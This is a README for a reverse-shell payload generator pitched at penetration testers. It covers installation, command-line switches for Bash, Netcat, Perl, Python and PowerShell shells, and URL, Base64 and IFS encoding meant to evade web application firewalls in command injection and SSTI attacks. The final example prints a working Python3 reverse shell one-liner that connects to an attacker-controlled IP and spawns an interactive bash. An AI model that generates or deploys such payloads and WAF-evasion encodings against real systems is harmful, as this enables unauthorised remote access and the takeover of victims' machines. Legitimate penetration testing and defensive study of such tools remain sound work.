### **What Is It?**
**Omni-Reverse-Payload-Generator** is a versatile and powerful tool designed for penetration testers and security professionals. It allows you to quickly generate reverse shell payloads offline using various programming languages and shells, such as Bash, Python, PowerShell, and more. The tool supports advanced encoding techniques, making it effective for bypassing security controls like Web Application Firewalls (WAFs). 

### **Key Features**
- **Multiple Reverse Payload Generation**: Quickly generate payloads for various environments, including Bash, Netcat, Perl, Python, PowerShell, and MSSQL, ensuring compatibility with different target systems.
- **Environment Testing**: Generate commands to identify and test shell environments, such as PowerShell/CMD (Windows) and Bash/Sh (Unix/Linux), to verify which shell the target supports.
- **Advanced Encoding Options**: Utilize encoding techniques like URL encoding, Base64, and Internal Field Separator (IFS) manipulation to obfuscate payloads and bypass WAFs.
- **Customization and Flexibility**: Customize payloads with options to modify shell behavior, encoding, and injection methods tailored for specific vulnerabilities like SSTI and command injection.

### **Installation**
```bash
git clone https://github.com/loganpkinfosec/omni-reverse-payload-generator/
cd omni-reverse-payload-generator
chmod +x *
```

### **Usage**

```bash
# Basic Usage Format
python3 Omni-Payload-Generator.py <payload_type> <LHOST> <LPORT> [options]

# Example Commands
python3 Omni-Payload-Generator.py -ps 10.10.14.20 443       # Generate PowerShell reverse shell
python3 Omni-Payload-Generator.py -b 10.10.14.20 443 -e     # Generate Bash reverse shell with URL encoding
python3 Omni-Payload-Generator.py -y3 10.10.14.20 443 -ifs injection  # Generate Python 3 reverse shell with IFS manipulation for command injection
python3 Omni-Payload-Generator.py -y 10.10.14.20 443 -ifs ssti -e  # Python reverse shell for SSTI with URL encoding
```

### **Command Options/Swiches**
- `-b, --bash`: Generates a Bash reverse shell command.
- `-n, --netcat`: Generates a Netcat reverse shell command.
- `-p, --perl`: Generates a Perl reverse shell command.
- `-y, --python`: Generates a Python reverse shell command.
- `-y3, --python3`: Generates a Python 3 reverse shell command.
- `-ps, --powershell`: Generates a PowerShell reverse shell command in Base64.
- `-e, --urlencode`: URL encodes the generated reverse shell command.
- `-ifs, --use-ifs`: Uses IFS manipulation (`injection` or `ssti`) to replace spaces, enhancing payload delivery in specific scenarios.


**Example: Generating a Python3 Shell with IFS Manipulation**
```bash
Command: python3 Omni-Payload-Generator.py -y3 10.10.14.20 443 -ifs injection
Output: python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.20",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.run(["/bin/bash","-i"]);'
```
